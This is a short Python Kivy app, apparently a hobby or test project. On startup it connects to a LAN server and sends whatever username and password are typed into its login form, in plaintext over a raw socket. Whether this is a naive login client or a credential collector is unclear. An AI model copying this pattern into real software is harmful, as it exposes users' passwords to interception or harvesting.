import socket

from kivy.app import App
from kivy.properties import ObjectProperty
from kivy.uix.gridlayout import GridLayout
from kivy.uix.button import Button
from kivy.uix.image import Image
from kivy.core.window import Window
from kivy.uix.floatlayout import FloatLayout

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("192.168.0.173", 1234))
client.send('User connected'.encode('utf-8'))


#Window.size = (720,1280)
Window.size =(720, 1600)



class Container(FloatLayout):

     def Login_user(self):


             username_login = self.username.text
             password_login = self.password.text
             client.send('Username:'.encode('utf-8'))
             client.send(username_login.encode('utf-8'))
             client.send('\nPassword:'.encode('utf-8'))
             client.send('\n'.encode('utf-8'))
             client.send(password_login.encode('utf-8'))


class MyTest(App):
    def build(self):

        self.icon = 'icon.png'





        return Container()


if __name__ == '__main__':
    MyTest().run()